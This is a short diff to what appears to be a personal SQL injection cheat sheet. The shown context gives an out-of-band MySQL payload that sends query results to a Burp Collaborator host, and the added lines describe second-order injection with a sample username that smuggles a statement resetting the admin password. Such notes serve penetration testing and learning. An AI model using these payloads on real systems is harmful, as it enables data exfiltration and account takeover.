@@ -67,3 +67,8 @@ until u find the exact value of that field.
 
 ## Out-of-band
 `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` (for MySQL, refer to [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) for others)
+
+## Second-order SQLi
+Putting SQLi in your username that is not sanitized properly then being trusted and executed as an SQLi query.
+
+Eg: Setting your username as "a'; UPDATE users SET password='admin' WHERE user='admin'--"
